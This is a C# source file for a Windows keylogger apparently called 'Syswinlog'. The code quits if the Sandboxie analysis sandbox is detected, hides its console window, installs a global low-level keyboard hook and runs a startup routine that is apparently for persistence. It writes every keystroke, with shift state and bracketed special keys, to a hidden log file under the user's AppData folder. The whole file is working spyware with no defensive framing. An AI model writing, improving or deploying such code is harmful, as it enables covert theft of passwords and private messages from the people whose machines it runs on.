﻿using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Timers;
using System.Windows.Forms;
using System.IO;
using Syswinlog.Classes.NativeMethods;
using Syswinlog.Classes.Constants;
using Syswinlog.Classes.Startup;
using Syswinlog.Classes.HostInfo;

namespace Syswinlog
{
    class Program
    {
        public static void Main(string[] args)
        {
            if( Utils.DetectSandboxie() ) {
                Terminate( "Sandboxie detected! [ABORTING]" );
                // StatusLog.Log( "Sandboxie detected! [ABORTING]" );
            }
            _hookptr = SetHook(KeyBoardProcCallback);
            SetConsoleWindow(
                Constants.ConsoleWindowState.SW_HIDE
            );

            Startup.Init();

            Application.Run();
            NativeMethods.UnhookWindowsHookEx(_hookptr);
        }

        public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
        {
            using (Process proc = Process.GetCurrentProcess()) {
                using (var procModule = proc.MainModule) {
                    return NativeMethods.SetWindowsHookEx(
                        Constants.whl_keyboard_ll, keyboardCallback, NativeMethods.GetModuleHandle(procModule.ModuleName), 0
                    );
                }
            }
        }

        public static IntPtr KeyBoardProcCallback(int ncode, IntPtr wParam, IntPtr lParam)
        {
            if( ncode == 0 ) {
                if( wParam == (IntPtr) Constants.wm_keydown ) {
                    int vkey = Marshal.ReadInt32(lParam);
                    char key = Char.ToLower(Convert.ToChar( NativeMethods.MapVirtualKey((uint)vkey, Constants.mapvk_to_char) ));
                    DispatchKey(key, vkey, PrintableKey(vkey));
                }
            }
            return NativeMethods.CallNextHookEx(_hookptr, ncode, wParam, lParam);
        }

        public static char ApplyKeyShiftModifier(char key) {
            return KeyMap.keymap.ContainsKey(key) ? KeyMap.keymap[key] : Char.ToUpper(key);
        }

        public static bool PrintableKey(int vkey) {
            return !KeyMap.nonPrintableKeys.Contains(vkey);
        }

        public static void DispatchKey(char key, int vkey, bool isPrintable)
        {
            uppercase = (NativeMethods.GetKeyState(0x14) & 0xffff) != 0;

            if ((NativeMethods.GetKeyState(0xA0) & 0x8000) != 0 ||
                (NativeMethods.GetKeyState(0xA1) & 0x8000) != 0) {
                uppercase = !uppercase;
            }

             StringBuilder _internal = new StringBuilder();
            if( isPrintable ) {
                key = (uppercase) ? ApplyKeyShiftModifier(key) : key;
                _internal.Append(key);
            } else {
                _internal.Append( "[" + ((Keys)vkey) + "]" );
            }
             
            using (_outfile = new StreamWriter(
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ApplicationData) + Constants.KeyLogPath, true, Encoding.Unicode) ) {
                _outfile.Write(_internal);
            }
        }

        public static void Terminate(string err)
        {
            Console.WriteLine($"{err}");
            Application.Exit();
        }

        public static void SetConsoleWindow(Constants.ConsoleWindowState state)
        {
            var handle = NativeMethods.GetConsoleWindow();
            if (handle != IntPtr.Zero) {
                NativeMethods.ShowWindow(handle, (int)state);
            }
        }

        #region variable declarations
        private static IntPtr _hookptr = IntPtr.Zero;
        private static bool uppercase;
        private static StreamWriter _outfile;
        // information about the current host
        private static HostInfo hostInfo;
        #endregion
    }
}
